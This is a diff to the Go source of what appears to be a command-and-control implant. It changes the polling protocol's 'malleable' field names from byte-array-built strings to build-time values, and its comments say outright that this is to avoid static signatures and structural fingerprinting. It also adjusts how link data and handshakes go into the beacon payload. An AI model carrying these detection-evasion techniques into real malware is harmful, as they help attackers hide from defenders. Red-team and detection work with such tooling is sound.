@@ -31,15 +31,20 @@ var (
 	pollStatusNoCommands = string([]byte{0x6e, 0x6f, 0x5f, 0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x73})                                                 // no_commands
 )
 
-// Malleable field values (constructed to avoid static signatures)
+// Malleable field values - injected at build time via ldflags
+// These can be customized in config.toml to avoid structural fingerprinting
 var (
-	MALLEABLE_REKEY_COMMAND         = string([]byte{0x72, 0x65, 0x6b, 0x65, 0x79, 0x5f, 0x72, 0x65, 0x71, 0x75, 0x69, 0x72, 0x65, 0x64})             // rekey_required
-	MALLEABLE_REKEY_STATUS_FIELD    = string([]byte{0x73, 0x74, 0x61, 0x74, 0x75, 0x73})                                                             // status
-	MALLEABLE_REKEY_DATA_FIELD      = string([]byte{0x64, 0x61, 0x74, 0x61})                                                                         // data
-	MALLEABLE_REKEY_ID_FIELD        = string([]byte{0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x5f, 0x64, 0x62, 0x5f, 0x69, 0x64})                   // command_db_id
-	MALLEABLE_LINK_DATA_FIELD       = string([]byte{0x6c, 0x64})                                                                                     // ld
-	MALLEABLE_LINK_HANDSHAKE_FIELD  = string([]byte{0x6c, 0x68})                                                                                     // lh
-	MALLEABLE_LINK_UNLINK_FIELD     = string([]byte{0x6c, 0x75})                                                                                     // lu
+	MALLEABLE_REKEY_COMMAND             = "rekey_required"
+	MALLEABLE_REKEY_STATUS_FIELD        = "status"
+	MALLEABLE_REKEY_DATA_FIELD          = "data"
+	MALLEABLE_REKEY_ID_FIELD            = "command_db_id"
+	MALLEABLE_LINK_DATA_FIELD           = "ld"
+	MALLEABLE_LINK_COMMANDS_FIELD       = "lc"
+	MALLEABLE_LINK_HANDSHAKE_FIELD      = "lh"
+	MALLEABLE_LINK_HANDSHAKE_RESP_FIELD = "lr"
+	MALLEABLE_LINK_UNLINK_FIELD         = "lu"
+	MALLEABLE_ROUTING_ID_FIELD          = "r"
+	MALLEABLE_PAYLOAD_FIELD             = "p"
 )
 
 // PollConfig holds the configuration for polling behavior
@@ -611,11 +616,11 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 					payload["results"] = results
 				}
 				if hasLinkData {
-					payload[MALLEABLE_LINK_DATA_FIELD] = linkData
+					payload[MALLEABLE_LINK_DATA_FIELD] = ConvertLinkDataToMaps(linkData)
 				}
 				if hasLinkHandshake {
 					// Send handshake as single object via "lh" field
-					payload[MALLEABLE_LINK_HANDSHAKE_FIELD] = linkHandshake
+					payload[MALLEABLE_LINK_HANDSHAKE_FIELD] = linkHandshake.ToMalleableMap()
 				}
 				if hasUnlinkNotifications {
 					payload[MALLEABLE_LINK_UNLINK_FIELD] = unlinkNotifications
